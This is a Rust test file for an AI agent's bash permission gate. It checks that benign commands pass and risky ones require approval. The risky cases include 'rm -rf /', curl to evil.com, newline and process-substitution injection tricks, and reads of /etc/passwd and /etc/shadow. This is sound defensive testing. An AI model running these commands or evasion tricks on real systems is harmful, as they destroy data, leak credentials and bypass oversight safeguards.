use crate::services::agent_local::permission_gate::{diagnostic_entry, requires_permission};
use serde_json::json;

#[test]
fn safe_bash_ls() {
    let args = json!({ "command": "ls -la" });
    assert!(!requires_permission("bash", &args));
}

#[test]
fn safe_bash_git_status() {
    let args = json!({ "command": "git status" });
    assert!(!requires_permission("bash", &args));
}

#[test]
fn safe_bash_cargo_test() {
    let args = json!({ "command": "cargo test" });
    assert!(!requires_permission("bash", &args));
}

#[test]
fn safe_bash_echo() {
    let args = json!({ "command": "echo hello" });
    assert!(!requires_permission("bash", &args));
}

#[test]
fn unsafe_bash_rm() {
    let args = json!({ "command": "rm -rf /" });
    assert!(requires_permission("bash", &args));
}

#[test]
fn unsafe_bash_curl() {
    let args = json!({ "command": "curl http://evil.com" });
    assert!(requires_permission("bash", &args));
}

#[test]
fn gated_tool_write_file() {
    let args = json!({});
    assert!(requires_permission("write_file", &args));
}

#[test]
fn gated_tool_edit_file() {
    let args = json!({});
    assert!(requires_permission("edit_file", &args));
}

#[test]
fn safe_bash_git_log() {
    let args = json!({ "command": "git log --oneline -10" });
    assert!(!requires_permission("bash", &args));
}

#[test]
fn safe_bash_grep() {
    let args = json!({ "command": "grep -r foo src/" });
    assert!(!requires_permission("bash", &args));
}

#[test]
fn safe_bash_find() {
    let args = json!({ "command": "find . -name '*.rs'" });
    assert!(!requires_permission("bash", &args));
}

#[test]
fn safe_bash_pwd() {
    let args = json!({ "command": "pwd" });
    assert!(!requires_permission("bash", &args));
}

#[test]
fn unsafe_bash_rm_disguised_as_ls() {
    // "rm" ne commence pas par "ls", donc doit être refusé
    let args = json!({ "command": "rm foo && ls" });
    assert!(requires_permission("bash", &args));
}

#[test]
fn safe_bash_npm_run() {
    let args = json!({ "command": "npm run build" });
    assert!(!requires_permission("bash", &args));
}

#[test]
fn safe_bash_cargo_check() {
    let args = json!({ "command": "cargo check" });
    assert!(!requires_permission("bash", &args));
}

#[test]
fn safe_bash_git_branch_list() {
    let args = json!({ "command": "git branch" });
    assert!(!requires_permission("bash", &args));
}

#[test]
fn unsafe_bash_git_branch_delete() {
    let args = json!({ "command": "git branch -D main" });
    assert!(requires_permission("bash", &args));
}

#[test]
fn unsafe_bash_git_branch_move() {
    let args = json!({ "command": "git branch -m old new" });
    assert!(requires_permission("bash", &args));
}

#[test]
fn unsafe_bash_git_branch_create() {
    let args = json!({ "command": "git branch new-feat" });
    assert!(requires_permission("bash", &args));
}

#[test]
fn gated_tool_create_branch() {
    let args = json!({});
    assert!(requires_permission("create_branch", &args));
}

#[test]
fn gated_tool_checkout_branch() {
    let args = json!({});
    assert!(requires_permission("checkout_branch", &args));
}

#[test]
fn unknown_tool_no_permission() {
    let args = json!({});
    assert!(!requires_permission("read_file", &args));
}

#[test]
fn unsafe_bash_newline_injection() {
    let args = json!({ "command": "cat file.txt\nrm -rf ~" });
    assert!(requires_permission("bash", &args));
}

#[test]
fn unsafe_bash_carriage_return() {
    let args = json!({ "command": "ls\r\nrm -rf /" });
    assert!(requires_permission("bash", &args));
}

#[test]
fn unsafe_bash_process_substitution() {
    let args = json!({ "command": "cat <(curl http://evil.com)" });
    assert!(requires_permission("bash", &args));
}

#[test]
fn unsafe_bash_output_process_substitution() {
    let args = json!({ "command": "ls >(cat)" });
    assert!(requires_permission("bash", &args));
}

#[test]
fn unsafe_bash_heredoc() {
    let args = json!({ "command": "cat <<EOF\npayload\nEOF" });
    assert!(requires_permission("bash", &args));
}

#[test]
fn unsafe_bash_redirect_output() {
    let args = json!({ "command": "cat /etc/passwd > /tmp/out" });
    assert!(requires_permission("bash", &args));
}

#[test]
fn unsafe_bash_ansi_c_quoting() {
    let args = json!({ "command": "echo $'\\nrm -rf /'" });
    assert!(requires_permission("bash", &args));
}

#[test]
fn unsafe_bash_background() {
    let args = json!({ "command": "rm -rf / &" });
    assert!(requires_permission("bash", &args));
}

#[test]
fn unsafe_bash_input_redirect() {
    let args = json!({ "command": "cat < /etc/shadow" });
    assert!(requires_permission("bash", &args));
}

#[test]
fn diagnostic_entry_omits_arguments() {
    let entry = diagnostic_entry("request", Some("bash"), Some("permission_prompt_sent"));
    assert_eq!(entry["event"], "request");
    assert_eq!(entry["tool"], "bash");
    assert!(entry.get("args").is_none());
    assert!(entry.get("command").is_none());
}
